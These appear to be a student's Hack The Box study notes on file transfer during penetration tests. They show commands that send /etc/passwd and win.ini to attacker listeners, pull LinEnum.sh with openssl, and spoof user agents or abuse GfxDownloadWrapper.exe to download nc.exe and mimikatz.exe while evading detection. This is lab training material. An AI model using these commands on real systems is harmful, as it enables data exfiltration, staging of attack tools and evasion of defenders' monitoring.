# Create Nginx Configuration File (/etc/nginx/sites-available/upload.conf)
# server {
#     listen 9001;
    
#     location /SecretUploadDirectory/ {
#         root    /var/www/uploads;
#         dav_methods PUT;
#     }
# }

# Symlink our Site to the sites-enabled Directory
abdeonix@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# Start Nginx
sudo systemctl restart nginx.service

# Verifying Errors
abdeonix@htb[/htb]$ tail -2 /var/log/nginx/error.log

# If port 80 is already in use 
# Remove NginxDefault Configuration
abdeonix@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default

# Upload File Using cURL
abdeonix@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

```



## Living off The Land
- LOLBins websites:
    - [Windows binaries](https://lolbas-project.github.io/)
    - [Linux binaries](https://gtfobins.github.io/)


### LOLBAS
- To search for download and upload functions in LOLBAS we can use /download or /upload.
- Example: CertReq.exe
```cmd
# Upload win.ini to our Pwnbox
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
- File Received in our Netcat Session
```bash
abdeonix@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
- If you have issues with CertReq.exe, Install the [latest version](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again

### GTFOBins
- To search for the download and upload function in GTFOBins, we can use +file download or +file upload.
- Example: openssl
```bash
# Our pwn box
abdeonix@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
abdeonix@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Download the file from the compromised machine
abdeonix@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```


### Other Common Living off the Land tools
- Bitsadmin Download function
- Certutil


## Evading Detection
- Malicious file transfers can be detected by their user agents.
- `Invoke-WebRequest` contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.
```powershell
# Listing out User Agents
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# Request with Chrome User Agent
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
- [ ] Check LOLBAS / GTFOBins
- An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically
```powershell
# Transferring File with GfxDownloadWrapper.exe
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

```
- Other, more commonly available binaries are also available, and it is worth checking the LOLBAS project to find a suitable "file download" binary that exists in your environment